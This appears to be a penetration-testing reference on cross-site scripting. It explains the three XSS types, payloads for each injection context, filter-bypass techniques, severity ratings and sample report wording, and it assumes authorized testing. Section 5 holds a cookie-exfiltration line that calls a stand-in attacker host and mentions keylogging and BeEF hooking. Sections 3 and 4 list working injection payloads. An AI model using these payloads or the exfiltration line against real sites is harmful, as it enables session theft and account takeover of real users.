# Cross-Site Scripting (XSS) Testing Notes — Offensive Security Reference

## 1. Root Cause
XSS occurs when user-controlled input is rendered into a page (HTML, JS, DOM, attribute, or URL context) without proper output encoding for that specific context. The vulnerability isn't "missing sanitization" in the abstract — it's that the *encoding applied doesn't match the context the data lands in* (HTML body vs. HTML attribute vs. JS string vs. URL vs. CSS all require different escaping).

## 2. The Three Types

### Reflected XSS
Payload is part of the request (URL param, form field) and immediately reflected in the response with no persistence. Test every reflected parameter — search boxes, error messages that echo input, redirect parameters.

### Stored XSS
Payload is saved server-side (comment, profile field, filename, support ticket) and rendered later to any viewer — including other users or admins, which is what makes stored XSS consistently higher severity than reflected. Always check: where is user input displayed *elsewhere* in the app, not just back to the submitting user? Admin panels, activity logs, and notification emails/messages are classic stored-XSS-to-privileged-user vectors.

### DOM-based XSS
Payload never touches the server — a client-side JS sink (`innerHTML`, `document.write`, `eval`, `location.href` assignment) consumes attacker-controlled data from a client-side source (`location.hash`, `location.search`, `document.referrer`, `postMessage`) and executes it. Requires reading JS source, not just HTTP traffic — Burp's DOM Invader or manual source review of every sink/source pair is necessary since server-side response diffing won't catch this.

## 3. Context-Aware Payload Selection
- **HTML body context:** `<script>alert(document.domain)</script>`, or if `<script>` is filtered: `<img src=x onerror=alert(document.domain)>`, `<svg onload=alert(document.domain)>`
- **HTML attribute context:** break out of the attribute first — `" onmouseover="alert(document.domain)` or `"><script>alert(1)</script>`
- **JavaScript string context:** break out of the string/script block — `';alert(document.domain);//` or `</script><script>alert(1)</script>`
- **URL context (`href`, `src`):** `javascript:alert(document.domain)` where scheme isn't restricted
- **CSS context:** `expression()` (legacy IE) or `url(javascript:...)` — mostly historical but check for CSS-injection-to-XSS in style attribute reflection

## 4. Filter/WAF Bypass Techniques
- Case variation (`<ScRiPt>`), null bytes, alternate tags (`<svg>`, `<img>`, `<body onload=>`, `<iframe srcdoc=>`)
- Event handler diversity — if `onerror`/`onload` are blocked, try `onfocus`, `onanimationstart`, `onpointerover`
- Encoding — HTML entity encoding (`&#x61;lert`), URL encoding, mixed-case Unicode
- Polyglot payloads that execute across multiple contexts simultaneously when you're unsure exactly where injection lands
- Template literal / backtick breakout for JS contexts using template strings

## 5. Impact Escalation (don't stop at `alert(1)`)
An `alert()` PoC proves the bug but understates impact in a report. Escalate to something that demonstrates real business risk:
- Session/token theft — `fetch('https://attacker.collab/?c='+document.cookie)` (only works if cookies lack `HttpOnly`)
- Full account takeover — chain with CSRF token theft from the DOM to perform authenticated actions as the victim (change email, add attacker as admin)
- Keylogging or credential-harvesting overlay injection for a persistent stored XSS
- BeEF hooking for demonstrating browser-level control in a report to a client, if in scope

## 6. Defense Checks Worth Verifying Even If XSS Is Blocked
- `HttpOnly` flag on session cookies (limits impact even if XSS exists elsewhere)
- CSP presence and strength — check for `unsafe-inline`/`unsafe-eval` that defeats the point of having a CSP at all, and whether it actually blocks your PoC's execution or just gets reported-and-ignored
- `X-Content-Type-Options: nosniff` to prevent MIME-sniffing-based XSS on non-HTML responses

## 7. Tools
| Tool | Use |
|---|---|
| **Burp Suite (DOM Invader)** | Automated DOM XSS source/sink tracing in-browser |
| **XSStrike** | Automated payload generation and context-aware fuzzing |
| **Dalfox** | Fast parameter-based XSS scanning |
| **BeEF** | Post-exploitation browser hooking for impact demonstration (in-scope only) |

## 8. Checklist
- [ ] Every reflected parameter tested with context-appropriate breakout payloads
- [ ] Every place user input is stored traced to *every* location it's later rendered, including admin/internal views
- [ ] DOM sinks/sources reviewed in client-side JS, not just server responses
- [ ] Filter/WAF behavior tested for encoding and tag/attribute bypass
- [ ] Cookie `HttpOnly`/`Secure`/`SameSite` flags checked regardless of whether XSS is found
- [ ] CSP reviewed for actual enforcement strength, not just presence
- [ ] Impact escalated beyond `alert()` for report-worthy PoC where in scope

## 9. Severity Notes
Stored XSS reachable by an admin/privileged user → Critical (effectively privilege escalation via session hijack). Stored XSS visible to other regular users → High. Reflected/DOM XSS requiring victim interaction (clicking a crafted link) → Medium–High depending on cookie protections and CSP presence.

## 10. Sample Reporting Language
**Finding title:** Stored XSS in Support Ticket "Subject" Field, Rendered in Admin Dashboard

**Description:** The support ticket subject field is stored without sanitization and rendered without output encoding in the administrative support dashboard. A payload of `<img src=x onerror=alert(document.domain)>` submitted via a standard user account executed in the browser context of any admin viewing the ticket queue.

**Impact:** Any authenticated user, including unprivileged ones, can execute arbitrary JavaScript in an administrator's browser session, enabling session/token theft and full administrative account takeover.

**Recommendation:** Apply context-appropriate output encoding at render time for all user-supplied data, including internal/admin-facing views. Set `HttpOnly` on session cookies and deploy a strict Content-Security-Policy without `unsafe-inline` as defense-in-depth.

---
*Assumes testing under written authorization. Session-hijacking PoCs and BeEF hooking against real user sessions require explicit scope approval.*
